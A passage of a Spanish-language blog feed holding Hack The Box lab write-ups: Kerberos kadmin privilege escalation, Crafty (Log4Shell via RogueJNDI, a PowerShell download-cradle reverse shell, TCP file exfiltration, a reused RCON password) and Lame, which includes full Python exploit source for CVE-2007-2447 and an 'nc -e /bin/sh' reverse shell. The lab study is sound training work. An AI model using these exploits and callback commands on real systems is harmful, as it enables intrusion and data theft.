&lt;p&gt;Investiguemos qué hace este archivo y cómo abrirlo.&lt;/p&gt;
&lt;p&gt;Segun la doc de MIT Kerberos, la tabla de claves es un archivo que almacena claves para los principales.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[admin@srv01 etc]$ klist -k /etc/krb5.keytab 
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege escalation&amp;lt;/span&amp;gt;&lt;/h1&gt;
&lt;p&gt;Parece que nuestro usuario también es un kadmin. Esto nos permite agregar principals a la tabla de claves. Podemos explotar esto agregando el usuario root a la tabla de claves con nuestra contraseña especificada.&lt;/p&gt;
&lt;h2&gt;Agregando root a la lista de principals keytab&lt;/h2&gt;
&lt;p&gt;Agregamos el usuario root con la password&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[admin@srv01 etc]$ kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB -q &quot;add_principal -pw test root@REALCORP.HTB&quot;
Couldn&apos;t open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
No policy specified for root@REALCORP.HTB; defaulting to no policy
Principal &quot;root@REALCORP.HTB&quot; created.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora podemos usar &lt;code&gt;ksu (ksu - Kerberized super-user)&lt;/code&gt; para su a root. (El archivo Keytab se restablece periódicamente, por lo que debemos ser rápidos).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[admin@srv01 etc]$ ksu
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
[root@srv01 etc]#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Iniciamos Sesion con exito como root.&lt;/p&gt;
</content:encoded></item><item><title>Crafty HTB Writeup</title><link>https://fuwari.vercel.app/posts/crafty/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/crafty/</guid><description>Crafty es una maquina Easy en la cual Atacamos un servidor de Minecraft.</description><pubDate>Sat, 06 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;En esta máquina encontraremos un servidor de &lt;code&gt;Minecraft 1.16.5&lt;/code&gt; vulnerable al conocido &lt;code&gt;CVE-2021-44228&lt;/code&gt;, tras abusar de él para obtener la ejecución de comandos en la máquina.&lt;/p&gt;
&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Information Gathering&amp;lt;/span&amp;gt;&lt;/h1&gt;
&lt;p&gt;Escaneado de todos los puertos TCP:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -sS -Pn -n -p- --open -vvv --min-rate 200 10.10.11.249 
Nmap scan report for 10.10.11.249
Host is up, received user-set (0.37s latency).
Scanned at 2024-06-17 10:07:01 -04 for 660s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   REASON
80/tcp    open  http      syn-ack ttl 127
25565/tcp open  minecraft syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 660.40 seconds
           Raw packets sent: 131533 (5.787MB) | Rcvd: 791 (130.048KB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;El sitio web nos redirige al dominio &lt;code&gt;crafty.htb&lt;/code&gt;s que añadiremos a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;... [snip]
10.10.11.249 crafty.htb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Al verlo, nos daremos cuenta de que es un portal a un servidor de Minecraft llamado «Crafty».&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.webp&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Por lo demás no parece que haya cosas más interesantes por aquí, porque los tres botones que se muestran no envían a nada interesante.&lt;/p&gt;
&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Enumeration&amp;lt;/span&amp;gt;&lt;/h1&gt;
&lt;h2&gt;Port 25565 - Minecraft 1.16.5&lt;/h2&gt;
&lt;p&gt;Haciendo un escaneo de servicios al puerto 25565 podemos ver de que servidor se trata (Recordemos que no solo existe el servidor de Minecraft de Mojang, también existen Paper, BungeeCord, Spigot.. etc)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -sCV -Pn -n -p 25565 -oN service -vvv --min-rate 200 10.10.11.249
Nmap scan report for 10.10.11.249
Host is up, received user-set (0.23s latency).
Scanned at 2024-06-17 10:23:28 -04 for 12s

PORT      STATE SERVICE   REASON          VERSION
25565/tcp open  minecraft syn-ack ttl 127 Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 17 10:23:40 2024 -- 1 IP address (1 host up) scanned in 12.02 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Se trata de un Minecraft Vanilla 1.16.5 por lo que parece. La versión 1.16.5 salió precisamente en septiembre de 2020, hace casi 4 años de la publicación de este post&lt;/p&gt;
&lt;p&gt;Exactamente el 9 de diciembre de 2021, se reveló una vulnerabilidad que parecía afectar a cualquier versión de Minecraft entre los rangos de 1.6.5 y 1.18, al utilizar la librería Log4J para el logueo tanto del cliente como del servidor, hacía al juego vulnerable al &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2021-44228&quot;&gt;CVE-2021-44228&lt;/a&gt;, en su momento varios aprovecharon esto para hackear servidores e incluso hackear a múltiples usuarios de diferentes servidores. Dado que este es el servidor Vanilla y 1.16.5 hay muchas posibilidades de que sea vulnerable a esta CVE.&lt;/p&gt;
&lt;p&gt;La vulnerabilidad es que el logger Log4J por defecto puede procesar mensajes especiales encerrados en &lt;code&gt;${}&lt;/code&gt;, y uno de ellos da la posibilidad de utilizar el JNDI (Java Native Directory Interface) para cargar clases externas y ejecutarlas en el contexto de la aplicación Java, por lo que podemos utilizar &lt;a href=&quot;https://github.com/veracode-research/rogue-jndi&quot;&gt;RogueJNDI&lt;/a&gt; para dar al servidor lo que está buscando y ejecutar comandos como el usuario del sistema que ejecuta el servidor, pero primero tenemos que conectarnos al servidor de Minecraft.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.webp&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Existen varios clientes CLI para esto, el que usaremos es el &lt;a href=&quot;https://github.com/MCCTeam/Minecraft-Console-Client&quot;&gt;Minecraft Console Client&lt;/a&gt; que podemos descargar ya compilado en su sección de releases.&lt;/p&gt;
&lt;p&gt;Usándolo, lo ajustamos para lo que queramos en su fichero de configuración generado o le damos a los ajustes que nos pide en pantalla y nos conectamos al servidor en cuestión:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Minecraft Console Client v1.20.4 - for MC 1.4.6 to 1.20.4 - Github.com/MCCTeam
GitHub build 263, built on 2024-04-15 from commit 403284c
Resolving crafty.htb...
Login :
Password(invisible): 
You chose to run in offline mode.
Retrieving Server Info...
Server version : 1.16.5 (protocol v754)
[MCC] Version is supported.
Logging in...
[MCC] Server is in offline mode.
[MCC] Server was successfully joined.
Type &apos;/quit&apos; to leave the server.
&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora, para hacer que el JNDI ejecute una clase arbitraria abusando del bug de Log4J simplemente debemos hacer que el logger procese un mensaje con una cadena como &lt;code&gt;${jndi:ldap://HOST:PORT/}&lt;/code&gt;, pero antes debemos tener un servidor especializado corriendo para procesar estas peticiones JNDI, yo usaré RogueJNDI como dije antes.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ java -jar RJNDI.jar -c &apos;ping -n 1 10.10.14.92&apos; -n 10.10.14.92
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.14.92:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.10.14.92:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.92:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.92:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.92:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.92:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.10.14.92:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.92:1389/o=reference to artsploit.controllers.RemoteReference

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos da el puerto del servidor LDAP y algunos mapeos para ejecutar clases Java específicas, usaremos &lt;code&gt;artsploit.controllers.RemoteReference&lt;/code&gt;, y cuando enviamos &lt;code&gt;${jndi:ldap://10.10.14.92:1389/o=reference}&lt;/code&gt; en el servidor Minecraft vemos en las consolas que:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;... [snip]
Sending LDAP reference result for http://10.10.14.92:8000/xExportObject.class
new http request from /10.10.11.249:49698 asking for /xExportObject.class
Sending LDAP reference result for http://10.10.14.92:8000/xExportObject.class
new http request from /10.10.11.249:49698 asking for /xExportObject.class
Sending LDAP reference result for http://10.10.14.92:8000/xExportObject.class
new http request from /10.10.11.249:49698 asking for /xExportObject.class
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; tshark -i tun0 icmp
    1 0.000000000 10.10.11.249 → 10.10.14.92  ICMP 60 Echo (ping) request  id=0x0001, seq=1/256, ttl=127
    2 0.000069813  10.10.14.92 → 10.10.11.249 ICMP 60 Echo (ping) reply    id=0x0001, seq=1/256, ttl=64 (request in 1)
    3 1.019781479 10.10.11.249 → 10.10.14.92  ICMP 60 Echo (ping) request  id=0x0001, seq=2/512, ttl=127
    4 1.019871252  10.10.14.92 → 10.10.11.249 ICMP 60 Echo (ping) reply    id=0x0001, seq=2/512, ttl=64 (request in 3)
    5 2.042625454 10.10.11.249 → 10.10.14.92  ICMP 60 Echo (ping) request  id=0x0001, seq=3/768, ttl=127
    6 2.042666787  10.10.14.92 → 10.10.11.249 ICMP 60 Echo (ping) reply    id=0x0001, seq=3/768, ttl=64 (request in 5)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Efectivamente, podemos ejecutar comandos. Ahora podemos enviarnos una consola&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ java -jar RJNDI.jar -c &quot;powershell IEX((New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.92:8000/shell&apos;))&quot; -n 10.10.14.92
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;The shell file contained a copy of the ConPtyShell of AntonioCoco&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.11.249 - - [17/Jun/2024 10:58:49] &quot;GET /uwu HTTP/1.1&quot; 200 -
10.10.11.249 - - [17/Jun/2024 10:58:51] &quot;GET /uwu HTTP/1.1&quot; 200 -
10.10.11.249 - - [17/Jun/2024 10:58:52] &quot;GET /uwu HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Con el terminal que recibimos de la máquina, ya podemos hacer cosas:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS C:\users\svc_minecraft\server&amp;gt; ls 


    Directory: C:\users\svc_minecraft\server


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/17/2024   3:01 AM                logs
d-----       10/27/2023   2:48 PM                plugins
d-----        6/17/2024   7:58 AM                world
-a----       11/14/2023  10:00 PM              2 banned-ips.json
-a----       11/14/2023  10:00 PM              2 banned-players.json
-a----       10/24/2023   1:48 PM            183 eula.txt
-a----       11/14/2023  11:22 PM              2 ops.json
-a----       10/24/2023   1:43 PM       37962360 server.jar
-a----       11/14/2023  10:00 PM           1130 server.properties
-a----        6/17/2024   7:56 AM            102 usercache.json
-a----       10/24/2023   1:51 PM              2 whitelist.json
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Y en la carpeta &lt;code&gt;Desktop&lt;/code&gt; de la carpeta personal encontraremos la primera bandera.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS C:\users\svc_minecraft\server&amp;gt; cd ..
PS C:\users\svc_minecraft&amp;gt; cd Desktop
PS C:\users\svc_minecraft\Desktop&amp;gt; dir


    Directory: C:\users\svc_minecraft\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----                                                                                               
-ar---        6/17/2024   3:02 AM             34 user.txt                                                                                           


PS C:\users\svc_minecraft\Desktop&amp;gt; type user.txt
2a6867d4f2483f2e715097acc3******
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege escalation&amp;lt;/span&amp;gt;&lt;/h1&gt;
&lt;p&gt;En la carpeta plugins del servidor, hay un plugin que no parece ser de terceros como SpigotMC o Modrinth. Es algo personalizado...&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS C:\users\svc_minecraft\server\plugins&amp;gt; ls


    Directory: C:\users\svc_minecraft\server\plugins


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/27/2023   2:48 PM           9996 playercounter-1.0-SNAPSHOT.jar
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos copiarlo a nuestro ordenador configurando un servidor SMB con la herramienta &lt;code&gt;smbserver.py&lt;/code&gt; de impacket&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ doas smbserver.py -smb2support shell .
doas (vzon@pwnedz0n) password: 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Pero hay un problema...&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS C:\users\svc_minecraft\server\plugins&amp;gt; copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.92\uwu\playercounter.jar
copy : You can&apos;t access this shared folder because your organization&apos;s security policies block unauthenticated guest access. These policies help  
protect your PC from unsafe or malicious devices on the network.
At line:1 char:1
+ copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.92\shell\playercounter.j ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Copy-Item], IOException
    + FullyQualifiedErrorId : System.IO.IOException,Microsoft.PowerShell.Commands.CopyItemCommand 
 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Así que tendremos que usar otra forma de copiar este jar a nuestro ordenador, una de ellas es simplemente programando un poco en PowerShell para crear un cliente TCP y enviar el fichero a nuestro netcat que almacenará lo que reciba en un fichero.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$client = New-Object System.Net.Sockets.TcpClient
$client.Connect(&quot;10.10.14.92&quot;, 8443)
$stream = $client.GetStream()
$bytes = [System.IO.File]::ReadAllBytes(&quot;plugins\playercounter-1.0-SNAPSHOT.jar&quot;)
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;❯ nc -lvnp 8443 &amp;gt; playercounter.jar
Listening on 0.0.0.0 8443
Connection received on 10.10.11.249 49733
❯ ls -la
total 63212
drwxr-xr-x  2 vzon vzon     4096 Jun 17 11:17 .
drwxr-xr-x 34 vzon vzon     4096 Jun 17 10:03 ..
-rw-r--r--  1 vzon vzon    11357 Apr 20 23:07 LICENSE
-rw-r--r--  1 vzon vzon    38563 Jun 17 10:43 MinecraftClient.backup.ini
-rw-r--r--  1 vzon vzon    38553 Jun 17 10:43 MinecraftClient.ini
-rw-r--r--  1 vzon vzon    13280 Apr 20 23:07 README.md
-rwxr-xr-x  1 vzon vzon 64587949 Jun 17 10:35 mcli
-rw-r--r--  1 vzon vzon     9996 Jun 17 11:10 playercounter.jar
-rw-r--r--  1 root root      649 Jun 17 10:23 service
❯ file playercounter.jar 
playercounter.jar: Java archive data (JAR)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora usemos un programa para descompilar el bytecode de este supuesto plugin, usaré &lt;a href=&quot;https://github.com/skylot/jadx/&quot;&gt;JADX&lt;/a&gt; para esto.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.webp&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Seleccionando el archivo en cuestión e inspeccionando sus clases, encontramos algo curioso en &lt;code&gt;htb.crafty.playercounter.Playercounter&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package htb.crafty.playercounter;

import java.io.IOException;
import java.io.PrintWriter;
import net.kronos.rkon.core.Rcon;
import net.kronos.rkon.core.ex.AuthenticationException;
import org.bukkit.plugin.java.JavaPlugin;

/* loaded from: playercounter.jar:htb/crafty/playercounter/Playercounter.class */
public final class Playercounter extends JavaPlugin {
    public void onEnable() {
        try {
            Rcon rcon = new Rcon(&quot;127.0.0.1&quot;, 27015, &quot;s67u84zKq8IXw&quot;.getBytes());
            try {
                String result = rcon.command(&quot;players online count&quot;);
                PrintWriter writer = new PrintWriter(&quot;C:\\inetpub\\wwwroot\\playercount.txt&quot;, &quot;UTF-8&quot;);
                writer.println(result);
            } catch (IOException e3) {
                throw new RuntimeException(e3);
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (AuthenticationException e2) {
            throw new RuntimeException(e2);
        }
    }

    public void onDisable() {
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;¡Una contraseña de texto plano para el RCON! Si lo intentamos en el sistema de vuelta no parece funcionar para el usuario actual, pero para el Administrador&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS C:\users\svc_minecraft\server\plugins&amp;gt; runas /user:Administrator whoami
Enter the password for Administrator: 
Attempting to start whoami as user &quot;CRAFTY\Administrator&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A partir de aquí podemos usar &lt;a href=&quot;https://github.com/antonioCoco/RunasCs&quot;&gt;RunasCs&lt;/a&gt; o las &lt;code&gt;runas&lt;/code&gt; por defecto de Windows para ejecutar comandos, yo me decantaré por la segunda. Después de enviarnos una consola obviamente ya seremos administradores.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS C:\Windows\system32&amp;gt; whoami
crafty\administrator
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Así que ahora podemos tomar la última bandera.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS C:\Windows\system32&amp;gt; cd ~ 
PS C:\Users\Administrator&amp;gt; cd Desktop 
PS C:\Users\Administrator\Desktop&amp;gt; dir 


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/17/2024   3:02 AM             34 root.txt


PS C:\Users\Administrator\Desktop&amp;gt; type root.txt 
7ca657db95d7e1ef6da65ac41b******
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Lame HTB Writeup</title><link>https://fuwari.vercel.app/posts/lame/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/lame/</guid><description>Easy Machine</description><pubDate>Sat, 06 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Information Gathering&lt;/h1&gt;
&lt;p&gt;Escaneado de todos los puertos TCP:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS -p- --open --min-rate 5000 -Pn -n 10.10.10.3  -oG nmap
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Puertos TCP abiertos enumerados:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p21,22,139,445,3632 -sVC 10.10.10.3 -Pn

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.170
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-07-04T14:04:23-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m31s, deviation: 2h49m45s, median: 29s
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h1&gt;Enumeration&lt;/h1&gt;
&lt;h2&gt;Port 445 - SMB (Samba smbd 3.0.20)&lt;/h2&gt;
&lt;p&gt;busca en google &lt;code&gt;Samba smbd 3.0.20 exploit&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Hay muchas opciones para usar, te recomiendo que pruebes varias y entiendas como funcionan, en este caso usaré esta:
&lt;a href=&quot;https://github.com/Ziemni/CVE-2007-2447-in-Python&quot;&gt;CVE&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3

import sys
try:
    from smb.SMBConnection import SMBConnection
except:
    print(&quot;pysmb is not installed: python3 -m pip install pysmb&quot;)
    quit()

if not (2 &amp;lt; len(sys.argv) &amp;lt; 5):
    print(&quot;Usage:&quot;)
    print(&quot;    python3 smbExploit.py &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt; &amp;lt;PAYLOAD&amp;gt;&quot;)
    print(&quot;       IP - Ip of the remote machine.&quot;)
    print(&quot;       PORT - (Optional) Port that smb is running on.&quot;)
    print(&quot;       PAYLOAD - Payload to be executed on the remote machine e.g. reverse shell.&quot;)
    print(&quot;&quot;)
    print(&quot;Example: python3 smbExploit.py 192.168.1.2 139 &apos;nc -e /bin/sh 192.168.1.1 4444&apos;&quot;)
    quit()

if len(sys.argv) == 3:
    ip = sys.argv[1]
    port = 139
    payload = sys.argv[2]
else:
    ip = sys.argv[1]
    port = sys.argv[2]
    payload = sys.argv[3]

user = &quot;`&quot; + payload + &quot;`&quot;
conn = SMBConnection(user, &quot;na&quot;, &quot;na&quot;, &quot;na&quot;, use_ntlm_v2=False)

try:
    print(&quot;[*] Sending the payload&quot;)
    conn.connect(ip, int(port))
    print(&quot;[*] Payload was send successfully&quot;)
    quit()
except Exception as e:
    print(&quot;[*] Something went wrong&quot;)
    print(&quot;ERROR:&quot;)
    print(e)
    quit()
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h1&gt;Exploitation&lt;/h1&gt;
&lt;h2&gt;CVE-2007-2447: Remote Command Injection&lt;/h2&gt;
&lt;p&gt;Escuchamos netcat en el puerto &lt;code&gt;4444&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -nlvp 4444
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;La guía del exploit nos dice que lo hagamos así:&lt;/p&gt;
&lt;h2&gt;Python Script&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;python3 smbExploit.py 10.10.10.3 445 &apos;nc -e /bin/sh 10.10.14.170 4444&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ejecutamos el exploit con &lt;code&gt;python3&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Introducimos la &lt;code&gt;IP&lt;/code&gt; de la máquina víctima.&lt;/li&gt;
&lt;li&gt;Ponemos el puerto del &lt;code&gt;SMB&lt;/code&gt; vulnerable, que en este caso es el &lt;code&gt;445&lt;/code&gt; por defecto.&lt;/li&gt;
&lt;li&gt;Luego dentro de las comillas ejecutamos el Revshell con netcat, colocando el tipo de shell que queremos, nuestra IP y el puerto en escucha que en este caso es &lt;code&gt;4444&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Inicia una sesión de shell Bash dentro de la cual puedes ejecutar comandos de forma interactiva, pero sin guardar ningún registro de sesión, ya que todo se descarta en &lt;code&gt;/dev/null&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;script /dev/null -c bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ya tenemos root&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Analysis HTB Writeup</title><link>https://fuwari.vercel.app/posts/analysis/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/analysis/</guid><description>Hard Machine</description><pubDate>Thu, 20 Jun 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Information Gathering&amp;lt;/span&amp;gt;&lt;/h1&gt;
&lt;p&gt;Comenzamos nuestros escaneos con nmap.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv 10.10.11.250 -oN Nmap 

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3306/tcp  open  mysql            syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
33060/tcp open  mysqlx           syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49682/tcp open  unknown          syn-ack ttl 127
49732/tcp open  unknown          syn-ack ttl 127
63270/tcp open  unknown          syn-ack ttl 127
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Nmap version Scan&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3306,5985,9389,33060,47001,49664,49665,49666,49667,49671,49674,49675,49676,49677,49682,49732,6327 -sCV 10.10.11.250 -oN Ports


Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-05 19:49 EDT
Nmap scan report for 10.10.11.250 (10.10.11.250)
Host is up (0.11s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
